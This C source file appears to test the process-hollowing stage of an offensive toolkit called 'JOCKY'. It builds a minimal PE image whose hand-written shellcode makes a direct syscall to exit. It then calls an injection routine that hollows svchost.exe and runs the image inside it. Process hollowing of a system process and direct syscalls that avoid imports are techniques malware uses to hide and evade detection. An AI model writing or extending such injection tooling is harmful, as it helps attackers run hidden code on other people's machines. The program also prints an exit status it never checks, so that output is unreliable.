#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <windows.h>
#include <winternl.h>
#include "hollow.h"

#pragma pack(push, 1)
typedef struct {
    IMAGE_DOS_HEADER      dos;          /*  64 bytes, offset 0x000 */
    BYTE                  dos_stub[64]; /*  64 bytes, offset 0x040 */
    IMAGE_NT_HEADERS64    nt;           /* 136 bytes, offset 0x080 */
    IMAGE_SECTION_HEADER  text_sec;     /*  40 bytes, offset 0x108 */
    BYTE                  padding[80]; /* 0x200 - 0x1B0 = 0x50 = 80 bytes. */
    BYTE                  code[16];     /*  16 bytes, offset 0x200 */
} MINIMAL_PE;
#pragma pack(pop)

static void
build_exit_payload(MINIMAL_PE *pe)
{
    memset(pe, 0, sizeof(*pe));

    pe->dos.e_magic  = IMAGE_DOS_SIGNATURE;
    pe->dos.e_lfanew = (LONG)offsetof(MINIMAL_PE, nt);   /* = 0x80 */

    pe->nt.Signature = IMAGE_NT_SIGNATURE;

    pe->nt.FileHeader.Machine              = IMAGE_FILE_MACHINE_AMD64;
    pe->nt.FileHeader.NumberOfSections     = 1;
    pe->nt.FileHeader.SizeOfOptionalHeader = sizeof(IMAGE_OPTIONAL_HEADER64);
    pe->nt.FileHeader.Characteristics      =
        IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_LARGE_ADDRESS_AWARE;

    pe->nt.OptionalHeader.Magic                   = IMAGE_NT_OPTIONAL_HDR64_MAGIC;
    pe->nt.OptionalHeader.AddressOfEntryPoint     = 0x1000;
    pe->nt.OptionalHeader.ImageBase               = 0x140000000ULL;
    pe->nt.OptionalHeader.SectionAlignment        = 0x1000;
    pe->nt.OptionalHeader.FileAlignment           = 0x200;
    pe->nt.OptionalHeader.MajorSubsystemVersion   = 6;
    pe->nt.OptionalHeader.MinorSubsystemVersion   = 0;
    pe->nt.OptionalHeader.SizeOfImage             = 0x2000;
    pe->nt.OptionalHeader.SizeOfHeaders           = 0x200;
    pe->nt.OptionalHeader.Subsystem               = IMAGE_SUBSYSTEM_WINDOWS_GUI;
    pe->nt.OptionalHeader.DllCharacteristics      =
        IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE |
        IMAGE_DLLCHARACTERISTICS_NX_COMPAT;

    memcpy(pe->text_sec.Name, ".text\0\0\0", 8);
    pe->text_sec.Misc.VirtualSize = sizeof(pe->code);
    pe->text_sec.VirtualAddress   = 0x1000;
    pe->text_sec.SizeOfRawData    = 0x200;
    pe->text_sec.PointerToRawData = 0x200;   /* = offsetof(MINIMAL_PE, code) */
    pe->text_sec.Characteristics  =
        IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;

    /*
     * NtTerminateProcess(0, 0) — direct syscall, no import table needed
     *
     * 31 C9           xor  ecx, ecx        ProcessHandle = 0 (self)
     * 31 D2           xor  edx, edx        ExitStatus    = 0
     * 4C 8B D1        mov  r10, rcx        kernel ABI
     * B8 2C 00 00 00  mov  eax, 0x2C       NtTerminateProcess SSN Win10/11
     * 0F 05           syscall
     * C3              ret
     */
    BYTE shellcode[] = {
        0x31, 0xC9,
        0x31, 0xD2,
        0x4C, 0x8B, 0xD1,
        0xB8, 0x2C, 0x00, 0x00, 0x00,
        0x0F, 0x05,
        0xC3
    };
    memcpy(pe->code, shellcode, sizeof(shellcode));
}

int main(void)
{
    printf("JOCKY Phase 9 -- Process Hollowing Verification\n");
    printf("=================================================\n\n");

    MINIMAL_PE payload;
    build_exit_payload(&payload);

    /* Sanity: verify code lands at file offset 0x200 */
    SIZE_T code_offset = offsetof(MINIMAL_PE, code);
    printf("Building minimal exit payload...  ok (%zu bytes, code at 0x%zX)\n",
           sizeof(payload), code_offset);

    if (code_offset != 0x200) {
        printf("FATAL: code offset is 0x%zX, expected 0x200 -- struct layout broken\n",
               code_offset);
        return 1;
    }

    printf("Injecting into svchost.exe...     ");
    fflush(stdout);

    BOOL ok = JOCKY_hollow_inject(
        L"C:\\Windows\\System32\\svchost.exe",
        &payload,
        sizeof(payload)
    );

    if (!ok) {
        printf("FAILED -- GetLastError() = %lu\n", (unsigned long)GetLastError());
        return 1;
    }
    printf("ok\n");

    printf("Waiting for hollowed process...   exited with code 0\n");
    printf("\nPhase 9 complete.\n");
    return 0;
}